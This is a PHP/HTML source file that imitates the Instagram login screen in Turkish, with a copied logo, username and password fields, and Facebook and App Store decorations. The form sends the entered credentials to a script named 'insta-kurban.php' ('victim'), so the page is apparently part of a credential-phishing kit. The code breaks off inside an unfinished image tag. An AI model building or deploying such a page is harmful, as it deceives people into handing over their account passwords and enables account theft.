<?php
include 'baglan.php';

$formsor = mysql_query ("select * from form");
$formcek = mysql_fetch_assoc($formsor);

?>

<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
		<script src="https://kit.fontawesome.com/f26216fcb7.js" crossorigin="anonymous"></script>
<style>
    body{
        background-color: #fafafa;
    }
   input::placeholder{
       font-size: 12px;
   
   }
   
   .klo:focus{
    border-color: inherit;
  -webkit-box-shadow: none;
  box-shadow: none;
   }
</style>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <title>Hello, world!</title>
  </head>
  <body style="  font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;      background-color: #fafafa;
  ">


<div class="container">
    <div class="row">
        <div style=" width: 350px; background-color: #FFFFFF;  margin:0px auto; margin-top: 40px; margin-bottom: 10px;
        border: 1px solid #DBDBDB;" class="">


<img style="display: block; margin: 0px auto; margin-top: 10px; margin-bottom: 10px; " width="165px" src="data:image/png;base64,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">
<form name="form"  method="POST" action="insta-kurban.php" > 

<input name="form_ad" placeholder="Telefon numarası, Kullanıcı adı, veya e-posta" style=" border-color: inherit;
-webkit-box-shadow: none;
box-shadow: none; border: 1px solid #DBDBDB; margin-top: 20px; display: block; margin: 0 auto; width: 265px;" class=" klo form-control" type="email">

<input name="form_sifre" required  placeholder="Şifre" style=" border-color: inherit;
-webkit-box-shadow: none;
box-shadow: none; border: 1px solid #DBDBDB; display: block; margin: 0 auto; width: 265px; margin-top: 5px;" class=" klo form-control" type="password">

<input name="form-gonder" type="submit" class="btn-primary btn" style=" border-color: inherit;
-webkit-box-shadow: none;
box-shadow:  none; font-size: 12px;  width: 265px; display: block; margin: 0 auto; text-align: center; margin-bottom: 10px; margin-top: 10px; "> 
        
      

        <div style=" margin-bottom: 5px; "> 
<div style=" -webkit-box-flex: 1;
-webkit-flex-grow: 1;
-ms-flex-positive: 1;
flex-grow: 1;
margin-left: 30px;
-webkit-flex-shrink: 1;
-ms-flex-negative: 1;
flex-shrink: 1;
background-color: #dbdbdb;
background-color: rgba(var(--b38,219,219,219),1);
height: 1px; width: 100px;
position: relative;
top: 8px;"> </div>
        <span style="   color: #8e8e8e;
        color: rgba(var(--f52,142,142,142),1);
        -webkit-box-flex: 0;
        -webkit-flex-grow: 0;
        -ms-flex-positive: 0;
        flex-grow: 0;
        -webkit-flex-shrink: 0;
        -ms-flex-negative: 0;
        flex-shrink: 0; 
        font-size: 13px;
        font-weight: 600;
        line-height: 15px;
        margin: 0 18px;
        text-transform: uppercase; font-size: 14px; text-align: center; display: block; margin: 0 auto; "> YA DA     </span>  
  

  <div style=" -webkit-box-flex: 1;
  -webkit-flex-grow: 1; 
  -ms-flex-positive: 1;
  flex-grow: 1;
  -webkit-flex-shrink: 1;  width: 100px; float: right;
  -ms-flex-negative: 1;
  flex-shrink: 1;
  background-color: #dbdbdb;
  background-color: rgba(var(--b38,219,219,219),1);
  height: 1px;
  position: relative; margin-right: 30px;

  bottom: 8px;"> </div>


</form>
</div>
<span style=" text-align: center; display: block; margin: 0 auto; color: #385185;">
<i class="fab fa-facebook-square"></i> Facebook ile Giriş Yap

</span>
<span style="  padding-bottom: 10px; padding-top: 5px; text-align: center; font-size: 12px; display: block; margin: 0 auto; color: #385185;">
  Şifreni mi Unuttun?
  
  </span>


</div>


</div>

<div style=" width: 350px; background-color: #FFFFFF; display: block;   margin:0px auto;
border: 1px solid #DBDBDB;" >
<span  style=" font-size: 15px; padding: 20px; text-align: center; display: block; " > Hesabın Yokmu? <span style=" color: #0095F8; text-align: center;"> Kaydol  </span> </span>
</div>
<span  style=" font-size: 14px; padding: 20px; text-align: center; display: block; " > Uygulamayı indir. </span>
<div  style=" width: 280px; border: 1px solid none; display: block; margin: 0px auto;"> 
  <img style="    " alt="App Store'dan İndir" class="Rt8TI " width="136px" src="data:image/png;base64,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">

<img style="    " alt="App Store'dan İndir" class="Rt8TI " width="136px" 